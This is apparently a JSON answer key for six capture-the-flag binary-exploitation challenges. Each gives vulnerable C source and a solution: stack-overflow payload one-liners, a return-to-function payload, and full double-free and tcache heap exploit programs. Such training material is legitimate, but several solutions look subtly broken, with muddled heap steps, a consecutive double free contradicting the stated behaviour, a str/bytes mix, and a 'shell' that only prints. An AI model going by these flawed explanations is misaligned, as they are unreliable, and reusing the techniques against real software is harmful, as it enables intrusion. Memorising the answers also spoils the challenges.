{
	"please_overflow_me":
	{
		"title": "Please overflow me",
		"description": "I've been feeling kinda... empty lately. Maybe a little buffer overflow will cheer me up!\n\nIn this challenge, you're given a simple binary with a small request: overflow it. Somewhere deep inside, there's a warm message waiting for you—maybe even a flag if you play your bytes right.\n\nCan you manipulate the program's memory to bring it to life?\n\n#include <stdlib.h>\n#include <unistd.h>\n#include <stdio.h>\n\nint main(int argc, char **argv)\n{\n    volatile int modified;\n    char buffer[64];\n\n    modified = 0;\n    printf(\"Please overflow me!\\n\");\n    gets(buffer);\n\n    if (modified != 0)\n    {\n        printf(\"Ah! I already feel better :)\\n\");\n        FILE *f = fopen(\"flag.txt\", \"r\");\n        if (f == NULL)\n        {\n            printf(\"Flag is not on the server\\nReach the admins!\");\n        }\n        else\n        {\n            char s;\n            while ((s = fgetc(f)) != EOF)\n            {\n                printf(\"%c\", s);\n            }\n            fclose(f);\n            exit(0);\n        }\n    }\n    else\n    {\n        printf(\"Try again?\\n\");\n    }\n}",
		"solution": "Solution:\n\nTo solve this challenge, you need to exploit a classic **buffer overflow** vulnerability.\n\nThe `gets()` function reads user input into a 64-byte buffer without bounds checking. Directly after the buffer in memory lies the `modified` variable. By inputting more than 64 bytes, you can overwrite `modified` with a non-zero value and trigger the condition that prints the flag.\n\nYou can craft the payload using Python:\n\n```python\npython3 -c \"print('A'*64 + '\\x01\\x00\\x00\\x00')\" | ./overflow_me\n```\n\nExplanation:\n\n'A'*64 fills the buffer.\n\n'\\x01\\x00\\x00\\x00' overwrites the modified variable with 1 (in little-endian).\n\nThe condition if (modified != 0) becomes true, and the flag is printed."
	},
	"revision":
	{
		"title": "Revision",
		"description": "They say knowledge is power... but calling the right function with the right magic might be even better.\n\nIn this binary, there's a special function hiding in plain sight — a function that holds the flag, but won't give it up easily. It demands the perfect incantation: two magical constants known only to the initiated. The only problem? It's never called.\n\nCan you trick the program into summoning them and claim your prize?\n\nvoid flag(int32_t arg1, int32_t arg2)\n{\n    if (arg1 != 0xdeadbeef || arg2 != 0xcafebabe)\n    {\n        puts(\"You are close but not there yet.…\");\n        exit(1);\n    }\n    \n    puts(\"YOU DID IT!\\nHere is your flag :\");\n    FILE* fp = fopen(\"flag.txt\", u\"r…\");\n    void var_38;\n    fread(&var_38, 1, 0x28, fp);\n    puts(&var_38);\n    fclose(fp);\n    exit(0);\n}\n\nchar* vuln()\n{\n    puts(\"Tell me... Have you revised your exploits skills?\");\n    void buf;\n    return gets(&buf);\n}\n\nint32_t main()\n{\n    void* const __return_addr_1 = __return_addr;\n    void* var_10 = &arg_4;\n    vuln();\n    puts(\"You failed.\");\n    return 0;\n}",
		"solution": "Solution:\n\nThis binary hides the flag inside a `flag()` function, which is **never called**. To get the flag, you need to:\n\n1. Redirect execution to the `flag()` function using it's memory address in a little endian format.\n2. Provide it with the correct arguments: `0xdeadbeef` and `0xcafebabe` in a little endian format.\n3. Add a random/filler address in between the function address and the arguments (this mimics the return address after calling a function).\n\nThe vulnerable point is the use of `gets()` in the `vuln()` function, which reads into an unbounded buffer. This gives you an opportunity to overwrite the return address on the stack and control execution flow.\n\nThe goal is to **perform a Return-Oriented Programming (ROP) attack** or just return directly to `flag()`.\n\nYou can craft a payload like this:\n\n```bash\npython2.7 -c \"import sys; sys.stdout.write('A'*32 + b'\\xb6\\x91\\x04\\x08' + b'BBBB' + b'\\xef\\xbe\\xad\\xde' + b'\\xbe\\xba\\xfe\\xca')\" | ./revision\n```\n\nPayload breakdown:\n\n- `'A'*32` — fills the buffer up to the saved return address.\n- `b'\\xb6\\x91\\x04\\x08'` — address of `flag()` function (example, replace with real address).\n- `b'BBBB'` — filler for the \"fake return address\" after `flag()` is called.\n- `b'\\xef\\xbe\\xad\\xde'` — `0xdeadbeef` in little-endian (first argument).\n- `b'\\xbe\\xba\\xfe\\xca'` — `0xcafebabe` in little-endian (second argument)."
	},
	"dead_simple":
	{
		"title": "Dead Simple",
		"description": "Some say success is earned. Others just overwrite it.\n\nIn this binary, your job is simple: stop sucking. The program's only requirement for spawning a shell is that one little variable — correct — holds the right magic number: 0xdeadbeef. The thing is, it never gets set… at least not by the program itself.\n\nLooks like you’ve got a chance to make things right by \"correcting\" the stack.\n\nCan you flip a few bytes and win a shell?\n\n#include <stdio.h>\n#include <stdlib.h>\n\nint main(int argc, const char *argv[])\n{\n    int correct = 0;\n    char bof[64];\n\n    scanf(\"%s\",bof);\n\n    if(correct != 0xdeadbeef)\n    {\n        puts(\"you suck!\\n\");\n        exit(0);\n    }\n    puts(\"you win!\\n\");\n    system(\"/bin/sh\");\n\n    return 0;\n}",
		"solution": "Solution:\n\nThe goal is to overwrite the `correct` variable so that it holds the value `0xdeadbeef`. This will trigger the win condition and give you a shell via `system(\"/bin/sh\")`.\n\nThe vulnerability lies in this line:\n\n```c\nscanf(\"%s\", bof);\n```\n\nSince `scanf(\"%s\", ...)` does **not** limit the number of bytes read, it allows you to overflow the 64-byte `bof` buffer and overwrite the `correct` variable sitting just after it on the stack.\n\nHere's how to do it using Python and Pwntools:\n\n```python\nfrom pwn import *\nimport sys\n\n# Craft payload: 64 bytes of filler + 4 bytes to overwrite 'correct' variable\npayload = 64 * 'a'\npayload += p32(0xdeadbeef)\n\n# Output payload to be used in the exploit\nsys.stdout.write(payload)\n```\n\nPayload Breakdown:\n- `'a' * 64` fills the `bof` buffer.\n- `p32(0xdeadbeef)` writes the desired value in **little-endian format** to the next 4 bytes — the `correct` variable."
	},
	"echo_chamber":
	{
		"title": "Echo Chamber",
		"description": "Your input echoes deeper than you think...\n\nThis binary takes what you say and copies it—faithfully, carelessly.\nHidden in the chamber is a whisper of something more, but no one ever listens.\n\nCan you make your echo reach where it matters?\n\n#include <stdio.h>\n#include <string.h>\n\nvoid abuse() {\n    char command[] = \"/bin/sh\";\n    printf(\"%s\\n\", command);\n}\n\nint main(int argv, char **argc) {\n    char buf[256];\n\n    strcpy(buf, argc[1]);\n    return 0;\n}",
		"solution": "Solution:\n\nThe goal of this challenge is to redirect program execution to the hidden `abuse()` function, which prints `/bin/sh`.\n\nLooking at the source code:\n\n```c\nvoid abuse() {\n    char command[] = \"/bin/sh\";\n    printf(\"%s\\n\", command);\n}\n```\n\nThis function is never called in `main()`. However, the `main()` function contains this:\n\n```c\nchar buf[256];\nstrcpy(buf, argc[1]);\n```\n\nThe use of `strcpy()` makes this vulnerable to a **classic buffer overflow** since it doesn't check the length of the input being copied into `buf`.\n\n- The buffer `buf` is 256 bytes.\n- The return address sits just after the saved base pointer, meaning the offset to reach it is typically **260** bytes (256 + 4 for saved EBP on 32-bit systems).\n- If we overflow `buf` with a total of **260 bytes** followed by the address of `abuse()`, we can overwrite the return address and redirect execution.\n\nPayload Example (Using Python 2.7):\n\n```bash\npython2.7 -c \"import sys; sys.stdout.write('A'*260 + '\\x12\\x34\\x56\\x78')\" | ./echo_chamber dummy_arg\n```\n\nReplace `\\x12\\x34\\x56\\x78` with the actual little-endian address of the `abuse()` function, which you can find using `gdb` or by decompiling the program."
	},
	"double_trouble":
	{
		"title": "Double Trouble",
		"description": "They freed it once. Then they freed it again. Now it's your problem.\n\nSomewhere in the heap, things have gone terribly wrong. A function pointer hangs in memory, waiting for the right nudge. With no tcache to protect the allocator and ASLR turned off, all that stands between you and control is how well you can clean up someone else’s mess.\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n\nvoid (*volatile func_ptr)();\n\nvoid hacked() {\n    printf(\"\uD83D\uDC80 Exploit Done! Opening a shell...\\n\");\n}\n\nint main() {\n    char *a = malloc(64);\n    char *b = a;\n\n    // Insert exploit code here\n\n    uintptr_t **fake_chunk = (uintptr_t **)e;\n    *fake_chunk = (uintptr_t *)&hacked;\n\n    func_ptr = *(void (**)())d;\n    func_ptr();\n\n    return 0;\n}",
		"solution": "Solution:\n\n1. **Allocate memory for two pointers**, `a` and `b`, where `b` points to the same memory as `a`.\n2. **Free `a`**, then **free `b`** to trigger the **double free** vulnerability.\n3. **Corrupt the heap** to overwrite a **function pointer** (`func_ptr`) to point to `hacked()`.\n4. **Trigger the overwritten function pointer** to execute the `hacked()` function.\n\nStep-by-Step Breakdown:\n\n1. Allocate Memory for Two Chunks:\n\nWe allocate memory for `a` and `b` (where `b` is set to point to the same memory as `a`):\n\n```c\nchar *a = malloc(64);\nchar *b = a;  // Both a and b point to the same block\n```\n\nAt this point, `a` and `b` both point to the same allocated memory chunk.\n\n2. Free the Chunks to Trigger the Double Free:\n\nNow, we perform the double free by freeing `a` and then freeing `b`. This will trigger a **double free** vulnerability.\n\n```c\nfree(a);  // Free first chunk\nfree(b);  // Free second chunk (double free!)\n```\n\nBecause `a` and `b` point to the same memory, calling `free(b)` after `free(a)` results in a **double free**, causing heap corruption.\n\n3. Corrupt the Heap and Overwrite the Function Pointer:\n\nWe now manipulate the heap by overwriting the function pointer `func_ptr` to point to the `hacked()` function. For this, we need to craft the exploit carefully.\n\nWe will assume that the function pointer `func_ptr` is stored at a location that can be overwritten by exploiting the double free. The goal is to control `func_ptr` so that it points to `hacked()`.\n\nThe vulnerable code would look something like this:\n\n```c\nuintptr_t **fake_chunk = (uintptr_t **)e;\n*fake_chunk = (uintptr_t *)&hacked;  // Overwrite function pointer with hacked's address\n```\n\nAfter that, we can trigger the overwritten function pointer to execute `hacked()`:\n\n```c\nfunc_ptr = *(void (**)())d;  // Retrieve the overwritten function pointer\nfunc_ptr();  // Call the function, which now points to hacked()\n```\n\nLet's assume that `e` and `d` are the locations where the corrupted function pointer resides.\n\n4. Full Exploit Code:\n\nHere’s the complete solution that triggers the double free and overwrites the function pointer:\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n\nvoid (*volatile func_ptr)();\n\nvoid hacked() {\n    printf(\"\uD83D\uDC80 Exploit Done! Opening a shell...\\n\");\n}\n\nint main() {\n    // Allocate two blocks of memory\n    char *a = malloc(64);\n    char *b = a;  // b points to the same memory as a\n\n    printf(\"Address of a: %p\\n\", (void*)a);\n    printf(\"Address of b: %p\\n\", (void*)b);\n\n    // Trigger the double free vulnerability\n    free(a);  // Free first chunk\n    free(b);  // Free the same chunk again (double free)\n\n    // Now the heap is corrupted, and we can proceed to overwrite the function pointer\n\n    char *d = malloc(64); // Takes the adress of ‘a’\n    char *e = malloc(64); // Also takes the adress of ‘a’\n\n    // Overwrite function pointer with the address of 'hacked'\n    uintptr_t *fake_chunk = (uintptr_t *)e;  // Point to corrupted heap address\n    *fake_chunk = (uintptr_t)&hacked;  // Set the function pointer to hacked's address\n\n    // Trigger the overwritten function pointer\n    func_ptr = *(void (**)())d;  // Get the overwritten function pointer\n    func_ptr();  // Call func_ptr(), which will now call 'hacked()'\n\n    return 0;\n}\n```"
	},
	"tcache_tactics":
	{
		"title": "Tcache Tactics",
		"description": "They say memory management is tricky... but with the right touch, you can make it bend to your will.\n\nIn this binary, there’s a hidden flaw — a vulnerability waiting to be exploited. The program, seemingly benign, hides a powerful secret: a double free waiting to be triggered. But it's not that simple. This system is protected by Tcache, ensuring that only the most clever exploiters can slip through the cracks.\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n\nvoid (*volatile func_ptr)();\n\nvoid hacked() {\n    printf(\"Exploit done ! Opening a shell...\\n\");\n}\n\nint main() {\n    char *a = malloc(64);\n    char *b = a;\n\n    // Insert exploitation code here\n\n    char *d = malloc(64);\n    char *e = malloc(64);\n\n    uintptr_t **fake_chunk = (uintptr_t **)e;\n    *fake_chunk = (uintptr_t *)&hacked;\n\n    func_ptr = *(void (**)())d;\n    func_ptr();\n\n    return 0;\n}",
		"solution": "Solution:\n\nTo exploit the **double free** vulnerability, bypass **Tcache** protection, and overwrite the function pointer, follow these steps:\n\n1. Allocate and Free Memory:\n   - The program starts by allocating memory for `a` and `b`, where `b` points to `a`. Then, we allocate 7 more chunks (`fill[7]`) to fill up the Tcache.\n   - Afterward, we free the allocated chunks in order to fill the Tcache with the freed memory blocks.\n\n2. Double Free:\n   - We then proceed to free `a` and immediately free `b`. Since `b` points to the same memory as `a`, this triggers a **double free** vulnerability.\n\n3. Bypassing Tcache:\n   - To avoid detection from Tcache, we allocate 7 more chunks to effectively clear the Tcache and make `a` available for reallocation.\n   - After this, we can safely free `b` without triggering any issues in Tcache.\n\n4. Corrupting the Heap:\n   - Now that the heap has been manipulated, we can use the `malloc()` calls to allocate new memory blocks (`d` and `e`).\n   - `e` now points to a chunk where we can overwrite its contents. By writing the address of the `hacked()` function into this chunk, we can control the execution flow.\n\n5. Overwriting the Function Pointer:\n   - Finally, we assign the value of the function pointer (`func_ptr`) to the address stored in `d`, which now points to the overwritten function pointer in `e`.\n   - Calling `func_ptr()` triggers the `hacked()` function, opening a shell.\n\nCode Solution:\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n\nvoid (*volatile func_ptr)();\n\nvoid hacked() {\n    printf(\"Exploit done! Opening a shell...\\n\");\n}\n\nint main() {\n    char *a = malloc(64);\n    char *b = a;\n    char *fill[7];\n    \n    // Step 1: Fill the Tcache with extra allocations\n    for (int i = 0; i < 7; i++) {\n        fill[i] = malloc(64);\n    }\n\n    // Step 2: Free the Tcache chunks\n    for (int i = 0; i < 7; i++) {\n        free(fill[i]); \n    }\n    \n    // Step 3: Free 'a' and fill the Tcache\n    free(a);\n    for (int i = 0; i < 7; i++) {\n        malloc(64);\n    }\n\n    // Step 4: Trigger the double free vulnerability\n    free(b);\n\n    // Step 5: Allocate new chunks\n    char *d = malloc(64);\n    char *e = malloc(64);\n\n    // Step 6: Overwrite the function pointer in 'e'\n    uintptr_t **fake_chunk = (uintptr_t **)e;\n    *fake_chunk = (uintptr_t *)&hacked;\n\n    // Step 7: Execute the function pointer to gain a shell\n    func_ptr = *(void (**)())d;\n    func_ptr();\n\n    return 0;\n}\n```"
	}
}